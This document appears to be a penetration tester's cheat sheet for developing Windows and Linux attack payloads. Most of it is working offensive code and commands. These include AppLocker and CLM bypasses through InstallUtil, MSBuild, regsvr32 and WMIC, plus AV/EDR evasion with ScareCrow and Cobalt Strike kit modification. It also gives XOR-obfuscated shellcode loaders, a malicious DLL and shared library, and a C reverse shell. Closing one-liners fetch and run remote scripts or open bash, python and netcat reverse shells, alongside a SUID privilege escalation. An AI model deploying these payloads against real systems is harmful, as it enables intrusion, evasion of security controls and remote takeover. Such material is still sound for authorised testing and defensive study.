# __Windows & Linux client payload development__
>Author: Pieter Miske
---
### __Windows payload development:__ 
##### _Process Injection payloads:_
Process injection is a method of executing arbitrary code in the address space of a separate live process\. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges\. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process\.
- For Process \(Hollowing\) Injection technique use [StagelessHollow](https://github.com/pietermiske/StagelessHollow) or [ProcessInjection](https://github.com/3xpl01tc0d3r/ProcessInjection)\.
- It is recommended to use the code as an example and create your own tools based on it\. This can help bypassing any AV solutions, hold custom shellcode and limit the need for arguments\. 
- Process Hollowing Injection compared to Vanilla Process Injecton still works but can raise unwanted attention if not combined with Parent Process Spoofing\. Therefore, it is recommended to use Parent Process Spoofing but make sure that the choosen parent process is suitable for injection\. 

##### _Create obfuscated and signed payload using ScareCrow:_
ScareCrow is a payload creation framework for side loading \(not injecting\) into a legitimate Windows process \(bypassing Application Whitelisting controls\)\. It leverages EDR flushing, AMSI/ETW bypassing, fake signing, and more\. 
- 1\. Generate a \.bin shellcode payload in your C2 framework \(e\.g\. Cobalt Strike, PoshC2\)
- 2\. Create obfuscated payload and compile it into a binary \(\.exe\) with fake code signing and all the good bypass stuff:
	- Compile payload (use a different domain if a Microsoft AV/EDR product is running on the target system) \([ScareCrow](https://github.com/optiv/ScareCrow)\): `./ScareCrow -I /<path to shellcode.bin> -domain <www.microsoft.com | www.cisco.com>`
	- Compile payload with bitsadmin remote download one\-liner \(ScareCrow\): `./ScareCrow -I /<path to shellcode.bin> -domain www.microsoft.com -delivery bits -url <URL to download payload from>`

##### _Payload leveraging InstallUtil & PowerShell Automation – bypass AppLocker/CLM:_
This payload can give you code execution in a by Applocker/CLM restricted environment by leveraging the native Windows Installutil program and the PowerShell Automation DLL\. 
>The payload must be downloaded to disk\. 
- 1\. Copy the following code to Visual Studio:
    ```Csharp
    using System;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using System.Configuration.Install;
    
    namespace Bypass
    {
        class Program
        {
            static void Main(string[] args)
            {
            //main method is not required but can be used to bypass AV
            }   
        }
        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                String cmd = "<PS COMMAND TO EXECUTE>";
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
                ps.AddScript(cmd);
                ps.Invoke();
                rs.Close();
            }
        }
    }
    ```
- 2\. Add the following 2 assembly references: 
	- References > Add Reference > Browse > "C:\\Windows\\assembly\\GAC\_MSIL\\System\.Management\.Automation\\1\.0\.0\.0\_\_31bf3856ad364e35\\System\.Management\.Automation\.dll\."\)
	- References > Add Reference > Assemblies > "System\.Configuration\.Install"
- 3\. The payload can be executed as follows to bypass AppLocker/CLM: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile=/LogToConsole=false /U C:\Users\Public\Documents\Bypass.exe`

##### _Bypass Applocker via Microsoft\.Workflow\.Compiler\.exe – bypass AppLocker/CLM:_
- 1\. On own system create test\.txt that contains the following C\# code: 
    ```Csharp
    using System;
    using System.Workflow.ComponentModel;
    
    public class Run : Activity {
    	public Run() {
    	    <C# CODE TO EXECUTE>;
    	}
    }
    ```
- 2\. On own system create run\.xml file that contains serialized XML code using the following PowerShell code: 
    ```Powershell
    $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
    $workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
    $SerializeuInputToWrapper =
    [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper',
    [Reflection.BindingFlags] 'NonPublic, static')
    Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
    $compilerparam = New-Object -Typename Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
    $pathvar = "test.txt"
    $compilerparam.GenerateInMemory = $True
    $output = "C:\users\public\documents\run.xml"
    $tmp = $SerializeuInputToWrapper.Invoke($null,
    @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerpararm, [string[]] @(,$pathvar)))
    Move-Item $tmp $output
    ```
- 3\. Upload both the run\.xml and test\.txt files to the target system and place them in the same folder
- 4\. Bypass applocker and execute the C\# code in the test\.txt file \(the results\.xml argument is just a mandatory parameter to make it work\): `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml
results.xml`

##### _Payload leveraging PowerShell Automation – bypass CLM:_
This payload leverages the powershell automation dll so the native Windows PowerShell executable is not touched and therefore can bypass CLM \(only CLM not AppLocker\)\.
- 1\. Copy the following code to Visual Studio:
    ```Csharp
    using System;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    
    namespace Bypass
    {
        class Program
        {
            static void Main(string[] args)
            {
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
                String cmd = "<PS command to execute>";
                ps.AddScript(cmd);
                ps.Invoke();
                rs.Close();
            }
        }
    }
    ```
- 2\. Add the automation reference before building: References > Add Reference > Browse > "C:\\Windows\\assembly\\GAC\_MSIL\\System\.Management\.Automation\\1\.0\.0\.0\_\_31bf3856ad364e35\\System\.Management\.Automation\.dll":

##### _XSL payload & WMIC exec method \- bypass application whitelisting:_
This payload can be used as an application whitelisting bypass method in a full AppLocker \(5/5\) enabled environment\. This payload is suitable as a first dropper payload to download and run the actual applocker bypass payload\. So this will not bypass AppLocker/CLM by itself and therefore you need to use additional bypass techniques like 'InstallUtil' or white\-listed directories to actually run a beacon payload\.
- 1\. Modify the following code and save it as dropper\.xsl:
    ```XML
    <?xml version='1.0'?>
    <stylesheet version="1.0"
    xmlns="http://www.w3.org/1999/XSL/Transform"
    xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="http://mycompany.com/mynamespace">
    
    <output method="text"/>
        <ms:script implements-prefix="user" language="JScript">
            <![CDATA[
            runC = "cmd.exe /c <command 1> && timeout 4 && <command 2>";
            new ActiveXObject("WScript.Shell").Run(runC,0,true);
            ]]>
        </ms:script>
    </stylesheet>
    ```
- 2\. Run the dropper\.xsl file from a remote location: `C:\Windows\System32\wbem\WMIC.exe process get brief /format:"http://<own ip>/dropper.xsl"`

##### _SCT payload & Regsvr32 exec method \- application whitelisting:_
This payload can be used as an application whitelisting bypass method in a AppLocker enabled environment where 'Script Rules" \(CLM\) is not enabled \(4/5\)\. Sinds CLM must be disabled to actually use this method in the first place, it is advised to directly run PS command to reflectively load any C\# beacon payload\. 
- 1\. Modify the following code and save it as dropper\.sct \(can hold multiple commands to run\):
    ```XML
    <?XML version="1.0"?>
    <scriptlet>
    <registration
        progid="New"
        classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
        <script language="JScript">
            <![CDATA[
                runC = "powershell.exe <COMMAND>";
                new ActiveXObject("WScript.Shell").Run(runC,0,true);
            ]]>
        </script>
    </registration>
    </scriptlet>
    ```
- 2\. Run the dropper\.sct file from a remote location: `regsvr32.exe /u /n /s /i:http://<own ip>/dropper.sct scrobj.dll`

##### _XML payload:_
- 1\. Create XML file, modify some variable names, add any PS command you would like to run and save it as dropper\.xml;
    ```XML
    <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
        <Target Name="newProjectTest">
            <RandomClassName />
        </Target>
        <UsingTask
            TaskName="RandomClassName"
            TaskFactory="CodeTaskFactory"
            AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
            <Task>
                <Reference Include="System.Management.Automation" />
                <Code Type="Class" Language="cs">
                    <![CDATA[
                        using System;
                        using System.IO;
                        using System.Diagnostics;
                        using System.Reflection;
                        using System.Runtime.InteropServices;
                        using System.Collections.ObjectModel;
                        using System.Management.Automation;
                        using System.Management.Automation.Runspaces;
                        using System.Text;
                        using Microsoft.Build.Framework;
                        using Microsoft.Build.Utilities;
                        public class RandomClassName : Task, ITask {
                            public override bool Execute() {
                                string runCom = "<PS COMMAND>";
                                Runspace rspace = RunspaceFactory.CreateRunspace();
                                rspace.Open();
                                RunspaceInvoke scriptInv = new RunspaceInvoke(rspace);
                                Pipeline pipel = rspace.CreatePipeline();
                                pipel.Commands.AddScript(runCom);
                                pipel.Invoke();
                                rspace.Close();
                                return true;
                            }
                        }
                    ]]>
                </Code>
            </Task>
        </UsingTask>
    </Project>
    ```
- 2\. Payload can be executed via: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe dropper.xml`

##### _DLL payload:_
Simple customizable \.dll payload that can run an OS command \(e\.g\. creates new admin user \(only works for domain joined systems\) or starts a reverse shell\):
- 1\. Create customdll\.cpp and modify the OS command to execute:
    ```C
    #include <windows.h>
    int owned()
    {
        WinExec("powershell.exe <PS COMMAND>",0);
        return 0;
    }
        BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
    {
        owned();
        return 0;
    }
    ```
- 2\. Make sure the C\+\+ compiler is installed on your system: `apt-get install g++-mingw-w64-x86-64`
- 3\. Compile the dll binary: 
	- 1: `x86_64-w64-mingw32-gcc -c -DBUILDING_EXAMPLE_DLL adduser.cpp`
	- 2: `x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.o -Wl,--out-implib,adduser.a`

##### _Windows Service EXE payload:_
This payload can be used in the situation a vulnerable service is exploited and will most likely crash shortly after exploitation \(e\.g\. unquoted service path and modifiable service binary\)\. This payload will start a second process that will stay alive after the vulnerable service process dies\. 
- 1\. Modify the code so it runs a command that for example runs a beacon payload or adds an admin user to the system and save it as script\.cs:
    ```Csharp
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    
    namespace WindowsService
    {
        class Program
        {
            static void Main(string[] args)
            {
            // start connection
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/C <COMMAND PLACE HOLDER>";
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            var proc = new Process();
            proc.StartInfo = psi;
            proc.Start();
            proc.WaitForExit();
            
            // optional to add second command or run original binary
            psi.FileName = "cmd.exe";
            psi.Arguments = "/C C:\\<PATH TO VULN SERVICE>";
            proc.StartInfo = psi;
            proc.Start();
            proc.WaitForExit();
            }
        }
    }
    ```
- 2\. Compile script\.cs on your local Windows machine: `csc.exe script.cs`



---
### __Windows payload obfuscation considerations & encoding options:__
##### _Identify bad code in artifacts and scipts:_
ThreatCheck attempts to find the end of the "bad bytes" and produces a hex dump up from that point\. This can be helpful when trying to identify the specific bad pieces of code in a tool/payload\. 
- Check for bad code \(show as the content closest to the end of the output\): 
	- Artifact \(\.exe | \.dll\) \(real\-time protection can be disabled\) \([ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)\): `ThreatCheck.exe -f <beacon.exe>`
	- Script \(\.ps1\) \(real\-time protection must be enabled\) \(Threatcheck\): `ThreatCheck.exe -f <script.ps1> -e AMSI`

##### _Obfuscate \.NET binary:_
- 1\. Generate a default \.NET based \.exe beacon/grunt/etc provided by your C2 framework
- 2\. Create obfuscated shellcode \(use \-f 2 to also base64 encode\) \([Donut](https://github.com/TheWover/donut)\): `donut.exe (-f 2) <payload.exe>`

##### _PowerShell encoding:_
- PowerShell encoding commands:
	- Windows: `$str = '<command>'; [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))`
	- Linux: `str='<command>' & echo -en $str | iconv -t UTF-16LE | base64 -w 0`
	- CyberChef: use the options 'decode text' \(UTF\-16LE\) \+ 'To Base64'
- Convert \.exe or \.bin to base64 string: `"C:\<path\to>\loader.bin"; [Convert]::ToBase64String([IO.File]::ReadAllBytes($f)) |Out-File enocded.b64`

##### _Cobalt Strike Artifact Kit modification:_
The "artifact\-kit" modifies the compiled cobalt strike artifacts like \.EXE's and \.DLL's\. 
>This obfuscation applies to the “jump psexec\(64\)” command and all stageless generated executables\.  
- 1\. Generate a “Windows Service EXE \(S\)” \(doesn’t matter if the listener is SMB or TCP\) 
- 2\. Run ThreatCheck against a 'beacon\-svc\.exe' binary
- 3\. Search where the returned bad code \(word/value/string\) appears in the kit \(/opt/cobaltstrike/artifact\-kit\) and change the value to something new \(simple find & replace\): `grep -r <value>`
- 4\. Build these changes \(/opt/cobaltstrike/artifact\-kit\): `./build.sh`
- 5\. Copy the whole directory \(dist\-pipe\) containing the new artifact files \(e\.g\. artifact\.cna\) to your CS client system in the “colbaltstrike\\ArtifactKit\\dist\-pipe” folder\. 
- 6\. Make sure the Aggressor script \(artifact\.cna\) is \(re\)loaded in the client to use the modified artifact\.
- 7\. Test again with ThreatCheck and repeat until no more threads are detected\.

##### _Cobalt Strike Resource Kit modification:_
The Resource Kit contains templates for Cobalt Strike's script\-based payloads including PowerShell, VBA and HTA\.
>The obfuscation of the template “template\.x64\.ps1” applies to the “jump winrm64” command\. 
- 1\. Run ThreatCheck against a "template\.ps1" script \(located on the CS client in “cobaltstrike\\ResourceKit\\
- 2\. Based on the output, identify where the bad code is located in the script and change it \(find & replace\)\.
- 3\. Test again with ThreatCheck and repeat until no more threads are detected\.
- 4\. Load the Aggressor script \(resources\.cna\) to enable the use of the modified templates\. 



---
### Linux payload development: 
##### _Obfuscated payload based on C code:_
- 1\. Create encoder:
    ```C
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    unsigned char buf[] = "<SHELLCODE>";
    int main (int argc, char **argv)
    {
        char xor_key = 'J';
        int payload_length = (int) sizeof(buf);
        for (int i=0; i<payload_length; i++)
        {
            printf("\\x%02X",buf[i]^xor_key);
        }
        return 0;
    }
    ```
- 2\. Create shellcode and place it in the placeholder:
	- Run OS command: `msfvenom -p linux/x64/exec CMD="<COMMAND>" \-f c`
	- Reverse shell payload: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<own ip> LPORT=<port> -f c`
- 3\. Compile encoder: `gcc -o encoder.out encoder.c`
- 4\. Run the encoded and copy/paste the string in the script below: `./encoded`
- 5\. Create obfuscated payload:
    ```C
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    // Our obfuscated shellcode
    unsigned char buf[] = "<ENCODED STRING>";
    int main (int argc, char **argv)
    {
        char xor_key = 'J';
        int arraysize = (int) sizeof(buf);
        for (int i=0; i<arraysize-1; i++)
        {
            buf[i] = buf[i]^xor_key;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    ```
- 6\. Compile payload \(the extention of the payload doesn’t matter and can be used to bypass some security restrictions\): `gcc -m64 -fno-stack-protector -z execstack -o payload.out payload.c`

##### _Reverse shell payload:_
- 1\. Create payload\.c:
    ```C
    #include <stdio.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    
    #define REMOTE_ADDR "192.168.49.132"
    #define REMOTE_PORT 443
    int main(int argc, char *argv[])
    {
        struct sockaddr_in sa;
        int s;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
        sa.sin_port = htons(REMOTE_PORT);
        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        execve("/bin/bash", 0, 0);
    }
    ```
- 2\. Compile payload: `gcc -m64 -fno-stack-protector -z execstack -o payload.elf payload.c`

##### _Create Linux Shared Library payload:_
- 1\. Modify and save the following file as hax\.c:
    ```C
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h> // for setuid/setgid
    static void runmahpayload() __attribute__((constructor));
    void runmahpayload() {
        setuid(0);
        setgid(0);
        printf("DLL HIJACKING IN PROGRESS \n");
        system("<command to run>");
    }
    ```
- 2\. Compile the shared library object file\.c: `gcc -Wall -fPIC -c -o hax.o hax.c`
- 3\. Produce the shared library file: `gcc -shared -o libhax.so hax.o`

##### _Reverse shell one\-liners and scripts:_
- Obfuscated ELF binary that runs as new process: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<own ip> LPORT=443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf`
- Resh\.now\.sh script:
	- 1\. Download and create script from resh\.now\.sh: `https://resh.now.sh/<own ip>:<port>`
	- 2\. Use the following line as payload \(URL encode if ran from a webshell\): 
		- If curl is present: `curl http://<own ip>:<port>/shell.sh | sh`
		- If wget is present: `wget http://<own ip>:8080/shell.sh -O resh.sh && chmod +x resh.sh && ./resh.sh`
- Bash: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
- Python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- Netcat: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

##### _Privilege escalation payload:_
This method can be used to escalate privileges as an alternative for a reverse shell. 
- 1\. Use the following command to create a bash script which sets the SUID bit for /bin/bash: `echo $'#!/bin/bash\n/bin/chmod u+s /bin/bash' > script.sh`
- 2\. \(optional\) verify if the SUID bit \(\-rw\[s\]r\-xr\-x\) was set successfully: `ls -lah /bin/bash`
- 3\. Escalate current shell to root: `bash -p`

